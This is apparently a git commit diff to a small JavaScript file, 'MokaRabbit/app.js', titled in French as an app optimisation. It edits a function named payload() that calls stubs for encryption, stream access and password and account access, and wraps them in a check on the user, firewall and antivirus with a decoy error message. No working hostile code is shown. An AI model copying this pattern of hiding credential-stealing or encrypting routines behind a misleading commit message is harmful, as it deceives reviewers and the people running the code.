2bb8030309d77d1b7ffa3ab1e752077e3366e3af
G0LD R4BB1T <goldrabbit907@gmail.com>
2024-08-31 23:36:08 +0200

    optimisation de l'app

--- MokaRabbit/app.js
+++ MokaRabbit/app.js
@@ -1,7 +1,13 @@
 function payload() {
+  if (userConnected && firewall && antivirus){
+
+    
  crypt()
  access_stream()
  access_passwords_and_account()
+    }else{
+    console.error("oups une erreur s'est produite :(")
+    }
 }
 
 function crypt(){
